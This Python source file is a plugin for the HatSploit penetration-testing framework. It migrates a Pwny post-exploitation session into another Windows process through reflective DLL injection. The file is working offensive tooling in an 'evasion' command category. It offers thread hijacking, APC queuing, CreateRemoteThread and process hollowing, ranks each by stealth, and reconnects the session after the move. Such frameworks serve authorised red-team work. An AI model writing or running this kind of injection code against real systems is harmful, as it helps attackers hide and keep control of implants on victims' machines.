"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import time

from pwny import Pwny
from pwny.api import *
from pwny.types import *

from badges.cmd import Command

from hatsploit.lib.core.plugin import Plugin

MIGRATE_BASE = 29

MIGRATE_LOAD = tlv_custom_tag(API_CALL_STATIC, MIGRATE_BASE, API_CALL)
TLV_TYPE_INJECT_TECHNIQUE = tlv_custom_type(TLV_TYPE_INT, MIGRATE_BASE, API_TYPE)
TLV_TYPE_MIGRATE_ERROR = tlv_custom_type(TLV_TYPE_STRING, MIGRATE_BASE, API_TYPE)

# Injection technique constants (must match inject_tech.h)
INJECT_TECH_CRT = 0
INJECT_TECH_APC = 1
INJECT_TECH_HIJACK = 2
INJECT_TECH_HOLLOW = 3
INJECT_TECH_DEFAULT = INJECT_TECH_HIJACK

TECHNIQUE_MAP = {
    'hijack': INJECT_TECH_HIJACK,
    'apc': INJECT_TECH_APC,
    'crt': INJECT_TECH_CRT,
    'hollow': INJECT_TECH_HOLLOW,
}

TECHNIQUE_NAMES = {
    INJECT_TECH_CRT: 'CreateRemoteThread (noisy)',
    INJECT_TECH_APC: 'QueueUserAPC (moderate)',
    INJECT_TECH_HIJACK: 'Thread Hijack (stealthy)',
    INJECT_TECH_HOLLOW: 'Process Hollow (stealthiest)',
}


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Migrate Plugin",
            'Plugin': "migrate",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Migrate into another process via reflective DLL injection.",
        })

        self.commands = [
            Command({
                'Category': "evasion",
                'Name': "migrate",
                'Description': "Migrate into another process via reflective DLL injection.",
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "Target process ID to migrate into "
                                    "(not required for hollow technique).",
                            'type': int,
                            'nargs': '?',
                            'default': 0,
                        }
                    ),
                    (
                        ('-t', '--technique'),
                        {
                            'help': "Injection technique: hijack (default, stealthy), "
                                    "apc (moderate), crt (legacy, noisy), "
                                    "hollow (stealthiest, spawns own process).",
                            'metavar': 'TECH',
                            'choices': list(TECHNIQUE_MAP.keys()),
                            'default': 'hijack',
                        }
                    ),
                ]
            })
        ]

    def migrate(self, args):
        technique = TECHNIQUE_MAP.get(args.technique, INJECT_TECH_DEFAULT)
        tech_name = TECHNIQUE_NAMES.get(technique, args.technique)
        is_hollow = (technique == INJECT_TECH_HOLLOW)

        if not is_hollow and not args.pid:
            self.print_error(
                "PID is required for non-hollow techniques. "
                "Use -t hollow to spawn a new process."
            )
            return

        result = self.session.send_command(tag=PROCESS_GET_PID)
        curr_pid = result.get_int(TLV_TYPE_PID)

        if is_hollow:
            self.print_process(
                f"Migrating from PID {curr_pid} into new process "
                f"[{tech_name}]..."
            )
        else:
            self.print_process(
                f"Migrating from PID {curr_pid} to PID {args.pid} "
                f"[{tech_name}]..."
            )

        library = Pwny(target='x86_64-w64-mingw32').to_binary('dll')

        if not library:
            self.print_error("DLL binary not found for target architecture!")
            return

        self.print_process(
            f"Injecting DLL ({len(library)} bytes)..."
        )

        cmd_args = {
            TLV_TYPE_BYTES: library,
            TLV_TYPE_INJECT_TECHNIQUE: technique,
        }

        if args.pid:
            cmd_args[TLV_TYPE_PID] = args.pid

        result = self.session.send_command(
            tag=MIGRATE_LOAD,
            plugin=self.plugin,
            args=cmd_args,
        )

        status = result.get_int(TLV_TYPE_STATUS)

        if status == TLV_STATUS_QUIT:
            self.print_process("Migration initiated, reconnecting...")

            time.sleep(1)

            self.session.open(self.session.channel.client.client)
            self.session.channel.secure = False

            target_desc = "new process" if is_hollow else f"PID {args.pid}"
            self.print_success(
                f"Successfully migrated to {target_desc}!"
            )
        else:
            error_msg = result.get_string(TLV_TYPE_MIGRATE_ERROR)
            if error_msg:
                self.print_error(f"Migration failed: {error_msg}")
            elif is_hollow:
                self.print_error(
                    "Migration failed! Could not spawn or redirect "
                    "the hollow host process."
                )
            else:
                self.print_error(
                    "Migration failed! Ensure the target PID exists, matches "
                    "architecture (x64->x64), and you have sufficient privileges."
                )

    def load(self):
        pass
